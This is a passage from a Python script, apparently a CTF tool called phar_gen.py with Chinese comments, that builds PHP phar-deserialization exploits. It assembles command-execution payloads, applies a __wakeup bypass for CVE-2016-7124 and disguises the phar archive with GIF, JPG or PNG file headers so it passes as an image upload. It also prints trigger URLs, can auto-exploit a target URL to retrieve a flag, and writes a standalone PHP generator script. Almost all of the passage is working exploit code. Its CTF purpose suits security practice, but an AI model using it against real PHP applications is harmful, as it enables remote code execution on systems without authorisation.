    builder = PayloadBuilder(target_analysis, args.exec)
    payload = builder.build()

    print(f"    执行函数: {payload['exec_func']}")
    print(f"    最终命令: {payload['final_command']}")
    print(f"    Payload 代码: {repr(payload['code'])}")
    print(f"    属性赋值:")
    for prop, val in payload['property_assignments'].items():
        print(f"      ${prop} = {repr(val)}")

    if payload.get('needs_wakeup_bypass'):
        print(f"    [!] 需要 __wakeup 绕过 (CVE-2016-7124)")

    if payload['bypass_report']:
        print(f"\n    绕过策略:")
        for item in payload['bypass_report']:
            print(f"      ✓ {item}")

    # ── 生成 phar ──
    print(f"\n[3] 生成 phar 文件...")

    # 使用绝对路径
    output_path = os.path.abspath(args.output)

    php_path = PharGenerator.find_php()
    if php_path:
        print(f"    PHP: {php_path}")
    else:
        print("    错误: 未找到本机 PHP")
        return

    success = PharGenerator.generate(
        analysis=target_analysis,
        payload=payload,
        output_path=output_path,
        inner_file=args.inner_file,
        stub_type=args.stub
    )

    if success:
        print(f"    ✓ phar 文件已生成: {output_path}")
        print(f"    文件大小: {os.path.getsize(output_path)} bytes")
        print(f"    Stub: {args.stub.upper() if args.stub != 'none' else '无'} + __HALT_COMPILER()")
        print(f"    内部文件: {args.inner_file}")

        # 生成触发 URL 提示
        if target_analysis.trigger_function:
            trigger_param = target_analysis.trigger_param or 'file'
            print(f"\n    触发方式:")
            print(f"      {target_analysis.trigger_function}(phar://<上传路径>/{args.inner_file})")
            print(f"      URL: /class.php?{trigger_param}=phar://<上传路径>/{args.inner_file}")
    else:
        print(f"    ✗ phar 生成失败")
        return

    # ── 自动解题 ──
    if args.target:
        print(f"\n[4] 自动解题 (目标: {args.target})")
        flag = AutoExploit.exploit(
            target_url=args.target,
            phar_path=output_path,
            analysis=target_analysis,
            inner_file=args.inner_file
        )
        if flag:
            print(f"\n{'═' * 50}")
            print(f"  FLAG: {flag}")
            print(f"{'═' * 50}")
        else:
            print(f"\n[-] 自动解题未成功, 请参考上面的分析手动调整")

    # ── 生成 PHP 生成脚本 (方便手动调试) ──
    gen_script_path = output_path + '.gen.php'
    _write_standalone_php(target_analysis, payload, output_path,
                          args.inner_file, args.stub, gen_script_path)
    print(f"\n[*] 独立 PHP 生成脚本: {gen_script_path}")
    print(f"    用法: {php_path} -d phar.readonly=0 {gen_script_path}")


def _write_standalone_php(analysis: PHPClassAnalysis, payload: dict,
                          output_path: str, inner_file: str,
                          stub_type: str, script_path: str):
    """生成独立可运行的 PHP 脚本"""
    stub_map = {
        'gif': 'GIF89a',
        'jpg': '\\xff\\xd8\\xff\\xe0',
        'png': '\\x89PNG\\r\\n\\x1a\\n',
        'none': '',
    }
    magic = stub_map.get(stub_type, 'GIF89a')

    prop_defs = []
    for prop in analysis.properties:
        prop_defs.append(f"    {prop.visibility} ${prop.name};")
    prop_def_code = "\n".join(prop_defs)

    prop_assigns = []
    for prop_name, value in payload['property_assignments'].items():
        php_expr = string_to_php_expr(value)
        prop_assigns.append(f"    $obj->{prop_name} = {php_expr};")
    prop_code = "\n".join(prop_assigns)

    wakeup_code = ""
    if payload.get('needs_wakeup_bypass'):
        wakeup_code = """
    // __wakeup bypass
    $s = serialize($obj);
    $s = preg_replace('/^(O:\\d+:"[^"]+":)(\\d+)/', '$1' . (count(get_object_vars($obj)) + 1), $s);
    $obj = unserialize($s);
"""

    script = f"""<?php
// Auto-generated by phar_gen.py — 独立可运行脚本
// 用法: php -d phar.readonly=0 {os.path.basename(script_path)}
error_reporting(0);
@unlink("{output_path}");

$phar = new Phar("{output_path}");
$phar->startBuffering();
$phar->addFromString("{inner_file}", "test");

class {analysis.name} {{
{prop_def_code}
}}

$obj = new {analysis.name}();
{prop_code}
{wakeup_code}
$phar->setMetadata($obj);
$phar->setStub("{magic}<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();

echo "phar generated: {output_path} (" . filesize("{output_path}") . " bytes)\\n";

// 验证
$p = new Phar("{output_path}");
$meta = $p->getMetadata();
echo "class: " . get_class($meta) . "\\n";
foreach (get_object_vars($meta) as $k => $v) {{
    echo "  \\$$k = " . bin2hex($v) . " (" . $v . ")\\n";
}}
"""

    with open(script_path, 'w') as f:
        f.write(script)


if __name__ == '__main__':
    main()
